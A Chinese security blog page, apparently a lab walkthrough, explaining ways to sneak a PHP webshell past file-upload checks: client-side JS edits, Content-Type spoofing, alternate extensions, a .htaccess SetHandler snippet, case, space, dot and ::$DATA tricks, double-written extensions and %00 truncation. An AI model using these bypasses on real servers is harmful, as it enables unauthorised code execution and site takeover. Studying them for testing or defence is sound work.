@@ -1,0 +1,1923 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="文件上传漏洞及绕过, HTML,CSS,JavaScript,php,python,linux,mysql等">
+    <meta name="description" content="专注web，分享生活，分享知识">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>文件上传漏洞及绕过 | Script kiddie&#39;s life</title>
+    <link rel="icon" type="image/jpeg" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/favicon.jpg">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/css/my.css">
+
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/jquery/jquery.min.js"></script>
+    
+<style type="text/css" lang="css">
+    #loading-container{
+        position: fixed;
+        top: 0;
+        left: 0;
+        min-height: 100vh;
+        width: 100vw;
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background: #FFF;
+        text-align: center;
+        /* loader页面消失采用渐隐的方式*/
+        -webkit-transition: opacity 1s ease;
+        -moz-transition: opacity 1s ease;
+        -o-transition: opacity 1s ease;
+        transition: opacity 1s ease;
+    }
+    .loading-image{
+        width: 120px;
+        height: 50px;
+        transform: translate(-50%);
+    }
+
+    .loading-image div:nth-child(2) {
+        -webkit-animation: pacman-balls 1s linear 0s infinite;
+        animation: pacman-balls 1s linear 0s infinite
+    }
+
+    .loading-image div:nth-child(3) {
+        -webkit-animation: pacman-balls 1s linear .33s infinite;
+        animation: pacman-balls 1s linear .33s infinite
+    }
+
+    .loading-image div:nth-child(4) {
+        -webkit-animation: pacman-balls 1s linear .66s infinite;
+        animation: pacman-balls 1s linear .66s infinite
+    }
+
+    .loading-image div:nth-child(5) {
+        -webkit-animation: pacman-balls 1s linear .99s infinite;
+        animation: pacman-balls 1s linear .99s infinite
+    }
+
+   .loading-image div:first-of-type {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
+        animation: rotate_pacman_half_up .5s 0s infinite;
+    }
+    .loading-image div:nth-child(2) {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
+        animation: rotate_pacman_half_down .5s 0s infinite;
+        margin-top: -50px;
+    }
+    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+
+    .loading-image div:nth-child(3),
+    .loading-image div:nth-child(4),
+    .loading-image div:nth-child(5),
+    .loading-image div:nth-child(6){
+        background-color: #49b1f5;
+        width: 15px;
+        height: 15px;
+        border-radius: 100%;
+        margin: 2px;
+        width: 10px;
+        height: 10px;
+        position: absolute;
+        transform: translateY(-6.25px);
+        top: 25px;
+        left: 100px;
+    }
+    .loading-text{
+        margin-bottom: 20vh;
+        text-align: center;
+        color: #2c3e50;
+        font-size: 2rem;
+        box-sizing: border-box;
+        padding: 0 10px;
+        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+    @media only screen and (max-width: 500px) {
+         .loading-text{
+            font-size: 1.5rem;
+         }
+    }
+    .fadeout {
+        opacity: 0;
+        filter: alpha(opacity=0);
+    }
+    /* logo出现动画 */
+    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
+    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
+ </style>
+ <script>
+(function () {
+    const loaded = function(){
+       setTimeout(function(){
+            const loader = document.getElementById("loading-container");
+            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
+            // document.getElementById("body-wrap").style.display="flex";
+            setTimeout(function(){
+                loader.style.display="none";
+            },1000); 
+        },1000);//强制显示loading page 1s  
+    };
+    loaded();
+})()
+ </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Script kiddie's life" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><style type="text/css" lang="css">
+    #loading-container{
+        position: fixed;
+        top: 0;
+        left: 0;
+        min-height: 100vh;
+        width: 100vw;
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background: #FFF;
+        text-align: center;
+        /* loader页面消失采用渐隐的方式*/
+        -webkit-transition: opacity 1s ease;
+        -moz-transition: opacity 1s ease;
+        -o-transition: opacity 1s ease;
+        transition: opacity 1s ease;
+    }
+    .loading-image{
+        width: 120px;
+        height: 50px;
+        transform: translate(-50%);
+    }
+
+    .loading-image div:nth-child(2) {
+        -webkit-animation: pacman-balls 1s linear 0s infinite;
+        animation: pacman-balls 1s linear 0s infinite
+    }
+
+    .loading-image div:nth-child(3) {
+        -webkit-animation: pacman-balls 1s linear .33s infinite;
+        animation: pacman-balls 1s linear .33s infinite
+    }
+
+    .loading-image div:nth-child(4) {
+        -webkit-animation: pacman-balls 1s linear .66s infinite;
+        animation: pacman-balls 1s linear .66s infinite
+    }
+
+    .loading-image div:nth-child(5) {
+        -webkit-animation: pacman-balls 1s linear .99s infinite;
+        animation: pacman-balls 1s linear .99s infinite
+    }
+
+   .loading-image div:first-of-type {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
+        animation: rotate_pacman_half_up .5s 0s infinite;
+    }
+    .loading-image div:nth-child(2) {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
+        animation: rotate_pacman_half_down .5s 0s infinite;
+        margin-top: -50px;
+    }
+    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+
+    .loading-image div:nth-child(3),
+    .loading-image div:nth-child(4),
+    .loading-image div:nth-child(5),
+    .loading-image div:nth-child(6){
+        background-color: #49b1f5;
+        width: 15px;
+        height: 15px;
+        border-radius: 100%;
+        margin: 2px;
+        width: 10px;
+        height: 10px;
+        position: absolute;
+        transform: translateY(-6.25px);
+        top: 25px;
+        left: 100px;
+    }
+    .loading-text{
+        margin-bottom: 20vh;
+        text-align: center;
+        color: #2c3e50;
+        font-size: 2rem;
+        box-sizing: border-box;
+        padding: 0 10px;
+        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+    @media only screen and (max-width: 500px) {
+         .loading-text{
+            font-size: 1.5rem;
+         }
+    }
+    .fadeout {
+        opacity: 0;
+        filter: alpha(opacity=0);
+    }
+    /* logo出现动画 */
+    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
+    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
+ </style>
+ <script>
+(function () {
+    const loaded = function(){
+       setTimeout(function(){
+            const loader = document.getElementById("loading-container");
+            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
+            // document.getElementById("body-wrap").style.display="flex";
+            setTimeout(function(){
+                loader.style.display="none";
+            },1000); 
+        },1000);//强制显示loading page 1s  
+    };
+    loaded();
+})()
+ </script></head>
+
+
+
+ <div id="loading-container">
+     <p class="loading-text">玩命加载中 . . . </p> 
+     <div class="loading-image">
+         <div></div>
+         <div></div>
+         <div></div>
+         <div></div> 
+         <div></div>
+     </div>
+ </div><body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/logo.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Script kiddie's life</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>文章分类</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/web%E5%AE%89%E5%85%A8">
+          
+          <span>web安全</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/CTF">
+          
+          <span>CTF</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/python">
+          
+          <span>python</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/linux">
+          
+          <span>linux</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-bicycle" style="zoom: 0.6;"></i>
+      
+      <span>各种折腾</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/%E5%8D%9A%E5%AE%A2">
+          
+          <span>博客</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-sitemap" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>文章标签</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>时间轴</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-envelope" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/logo.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Script kiddie's life</div>
+        <div class="logo-desc">
+            
+            专注web，分享生活，分享知识
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-bookmark"></i>
+			
+			文章分类
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/web%E5%AE%89%E5%85%A8 " style="margin-left:75px";>
+				  
+		          <span>web安全</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/CTF " style="margin-left:75px";>
+				  
+		          <span>CTF</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/python " style="margin-left:75px";>
+				  
+		          <span>python</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/linux " style="margin-left:75px";>
+				  
+		          <span>linux</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-bicycle"></i>
+			
+			各种折腾
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/%E5%8D%9A%E5%AE%A2 " style="margin-left:75px";>
+				  
+		          <span>博客</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-sitemap"></i>
+			
+			归档
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/tags " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>文章标签</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/archives " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>时间轴</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-envelope"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/featureimages/16.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">文件上传漏洞及绕过</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                <span class="chip bg-color">文件上传</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                web安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-04-20
+                </div>
+                
+
+                
+
+                
+
+                
+
+                 <span id="busuanzi_container_site_pv" style='display:none'></span> <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp; <span id="busuanzi_value_page_pv" ></span> 
+
+            </div>
+
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h3 id="文件上传的目的：上传代码文件让服务器执行-个人理解-。"><a href="#文件上传的目的：上传代码文件让服务器执行-个人理解-。" class="headerlink" title="文件上传的目的：上传代码文件让服务器执行(个人理解)。"></a>文件上传的目的：上传代码文件让服务器执行(个人理解)。</h3><h3 id="文件上传的绕过脑图"><a href="#文件上传的绕过脑图" class="headerlink" title="文件上传的绕过脑图"></a>文件上传的绕过脑图</h3><p><img src="https://Lmg66.github.io/img/3.png" alt="图片"></p>
+<h3 id="一-js本地验证绕过"><a href="#一-js本地验证绕过" class="headerlink" title="一.js本地验证绕过"></a>一.js本地验证绕过</h3><p>原理:本地的js,F12查看源代码发现是本地的验证</p>
+<p><img src="https://Lmg66.github.io/img/4.png" alt="图片"></p>
+<p>绕过姿势<br>1.因为属于本地的代码可以尝试修改,然后选择php文件发现上传成功。</p>
+<p><img src="https://Lmg66.github.io/img/5.png" alt="图片"></p>
+<p>2.采用burpsuite,先将文件的名称修改为jpg或png或gif,然后上传，burpsuite拦截将文件类型修改如图,发现能够上传成功<br>。</p>
+<p><img src="https://Lmg66.github.io/img/6.png" alt="图片"></p>
+<h3 id="二-MIME验证绕过-Content-Type"><a href="#二-MIME验证绕过-Content-Type" class="headerlink" title="二.MIME验证绕过(Content-Type)"></a>二.MIME验证绕过(Content-Type)</h3><p>原理:Content-Type（MediaType），即是Internet Media Type，互联网媒体类型，也叫做MIME类型。在互联网中有成百上千中不同的数据类型，HTTP在传输数据对象时会为他们打上称为MIME的数据格式标签，用于区分数据类型。最初MIME是用于电子邮件系统的，后来HTTP也采用了这一方案。在HTTP协议消息头中，使用Content-Type来表示请求和响应中的媒体类型信息。它用来告诉服务端如何处理请求的数据，以及告诉客户端（一般是浏览器）如何解析响应的数据，比如显示图片，解析并展示html等等。<br>使用burpsuite拦截分别为jpg和php类型观察Content-Type发现Content-Type不同.</p>
+<p><img src="https://Lmg66.github.io/img/7.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/8.png" alt="图片"></p>
+<p>拓展:</p>
+<p><img src="https://Lmg66.github.io/img/9.png" alt="图片"></p>
+<p>破解方法:<br>在burpsuite中更改Content-Type进行绕过即可</p>
+<p><img src="https://Lmg66.github.io/img/10.png" alt="图片"></p>
+<h3 id="三-黑名单绕过"><a href="#三-黑名单绕过" class="headerlink" title="三.黑名单绕过"></a>三.黑名单绕过</h3><p>原理:查看网站源代码发现过滤了asp,aspx,php,jsp,但其他的文件后缀可以上传，如phtml，phps，php5，pht</p>
+<p><img src="https://Lmg66.github.io/img/11.png" alt="图片"></p>
+<p>绕过姿势:将文件后缀名改为php5，phtml等,发现能够上传成功，此次没用过滤htaccess文件可以尝试上传。</p>
+<p>拓展:此破解方案需要Apache的httpd.conf有如下配置<br>AddType application/x-httpd-php .php .phtml .phps .php5 .pht<br>关于AddType指令<br>作用:在给定的文件拓展名与特定的内容类型之间建立映射(简单来说就是让phtml，phps，php5，pht等文件后缀的安装php代码来执行，个人理解)</p>
+<p>语法：AddType MIME-type extension [extension] …<br>AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。<br>AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系。</p>
+<h3 id="四-htaccess绕过"><a href="#四-htaccess绕过" class="headerlink" title="四..htaccess绕过"></a>四..htaccess绕过</h3><p>原理:.htaccess文件(或者”分布式配置文件”)提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用与此目录及其所有的子目录。<br>简单来说:就是htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置<br>他的功能:网页301重定向，自定义404错误页面，改变文件拓展名(此处所用),允许/阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能iis平台上不存在该文件，改文件默认开启，启用和关闭在httpd.conf文件中配置。<br>破解:构造.htaccess文件，文件内容，如图</p>
+<pre><code>&lt;FilesMatch &quot;2.jpg&quot;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</code></pre><p><img src="https://Lmg66.github.io/img/12.png" alt="图片"></p>
+<p>然后上传.htaccess文件和2.jpg的木马发现2.jpg被安装php代码执行然后用蚁剑连接，发现可以连接成功，如图</p>
+<p><img src="https://Lmg66.github.io/img/13.png" alt="图片"></p>
+<p>个人理解:通过对.htaccess的禁止目录列表理解运用给自己加了一个保护自己，防止开启phpstudy，其他人访问。</p>
+<p><img src="https://Lmg66.github.io/img/14.png" alt="图片"></p>
+<h3 id="五-大小写绕过"><a href="#五-大小写绕过" class="headerlink" title="五.大小写绕过"></a>五.大小写绕过</h3><p>原理:查看网站源代码发现没有过滤大小写，而windows对大小写不敏感，linux对大小写敏感</p>
+<p><img src="https://Lmg66.github.io/img/15.png" alt="图片"></p>
+<p>破解:修改文件拓展名称为大写，或者用burpsuiet抓包改为大写，发现上传成功，木马可以连接成功</p>
+<p><img src="https://Lmg66.github.io/img/16.png" alt="图片"></p>
+<h3 id="六-空格绕过"><a href="#六-空格绕过" class="headerlink" title="六.空格绕过"></a>六.空格绕过</h3><p>原理:windows等系统下，文件后缀加空格命名之后是默认自动删除空格。查看网站源代码发现过滤了大小写，没用过滤空格。</p>
+<p><img src="https://Lmg66.github.io/img/17.png" alt="图片"></p>
+<p>绕过姿势:上传php文件用burpsuite抓包，添加一个空发现上传成功。用蚁剑连接发现可以连接成功。如下图</p>
+<p><img src="https://Lmg66.github.io/img/18.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/19.png" alt="图片"></p>
+<h3 id="七-点的绕过"><a href="#七-点的绕过" class="headerlink" title="七.点的绕过"></a>七.点的绕过</h3><p>原理:同空格绕过原理一样，主要原因是windows等系统默认删除文件后缀的.和空格，查看网站源码发现，没有过滤点。</p>
+<p><img src="https://Lmg66.github.io/img/20.png" alt="图片"></p>
+<p>绕过姿势:上传php代码，burpsuite抓包加一个点，发现上传成功，用蚁剑连接发现连接成功。</p>
+<p><img src="https://Lmg66.github.io/img/21.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/22.png" alt="图片"></p>
+<h3 id="八-DATA绕过-此绕过只适用windows"><a href="#八-DATA绕过-此绕过只适用windows" class="headerlink" title="八.::$DATA绕过(此绕过只适用windows)"></a>八.::$DATA绕过(此绕过只适用windows)</h3><p>原理:php在windows的适合，如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持”::$DATA”之前的文件名，目的就是不检查后最名。查看网站源代码。发现没有过滤::$DATA。</p>
+<p><img src="https://Lmg66.github.io/img/23.png" alt="图片"></p>
+<p>破解:上传php文件，用burpsuite抓吧文件后缀改为php::$DATA，发现上传成功，用蚁剑链接，发现连接成功，同时打开上传文件发现后缀没有::$DATA</p>
+<p><img src="https://Lmg66.github.io/img/24.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/25.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/26.png" alt="图片"></p>
+<h3 id="九-点空格绕过"><a href="#九-点空格绕过" class="headerlink" title="九.点空格绕过"></a>九.点空格绕过</h3><p>原理:查看源码发现，都过滤但是，点和空格只是过滤了1次，所以我们可以尝试构造.php. .这样就只是过滤了文件末尾的点<br>而没有过滤第一个点，文件后缀变成了.php.实现了文件的上传。</p>
+<p><img src="https://Lmg66.github.io/img/27.png" alt="图片"></p>
+<p>绕过姿势:上传php文件，burpsuite抓包改文件后缀名称为.php. .上传，发现上传成功，用蚁剑连接发现上传成功。</p>
+<p><img src="https://Lmg66.github.io/img/28.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/29.png" alt="图片"></p>
+<h3 id="十-双写绕过"><a href="#十-双写绕过" class="headerlink" title="十.双写绕过"></a>十.双写绕过</h3><p>原理:查看源码发现，没有过滤点，空格，大写等，估计这种不是放在windows下的，这里可以用点大写空格:$DATA等绕过，不过这里的目的不是这个，是让学习双写绕过，看源码发现str_ireplace这个函数将php，php5，php4等后缀变成空格，且只执行了一次，所以可以尝试构造文件后缀为pphphp绕过。</p>
+<p><img src="https://Lmg66.github.io/img/30.png" alt="图片"></p>
+<p>绕过姿势:上传文件后缀为pphphp的文件，发现上传成功，然后蚁剑连接就可以了，发现可以连接成功。</p>
+<p><img src="https://Lmg66.github.io/img/31.png" alt="图片"></p>
+<h3 id="十一-00截断"><a href="#十一-00截断" class="headerlink" title="十一.%00截断"></a>十一.%00截断</h3><p>原理:查看源码发现使用了白名单，只允许jpg，png，gif文件的上传，所以前面使用的方法都不适用，然后我们发现路径img_path函数是让文件位置(save_path)加时间随机数(rand)的方法生成文件位置和文件名称,所以这里我们可以尝试在save_path的地方使用%00的方法截断后面的语句，burpsuite抓包发现，是可以更改save_path的，不过此方法有使用的限制。</p>
+<p>使用限制:</p>
+<p>1、php版本小于5.3.4</p>
+<p>2、php.ini的magic_quotes_gpc为OFF状态</p>
+<p><img src="https://Lmg66.github.io/img/32.png" alt="图片"></p>
+<p>(magic_quotes_gpc)函数的的底层实现是类似c语言，所以可以%00截断</p>
+<p><img src="https://Lmg66.github.io/img/33.png" alt="图片"></p>
+<p>绕过姿势：</p>
+<p>(get传输):上传php文件，burpsuite抓包，修改save_path如图所示，发现上传成功，使用蚁剑连接发现连接成功。</p>
+<p><img src="https://Lmg66.github.io/img/34.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/35.png" alt="图片"></p>
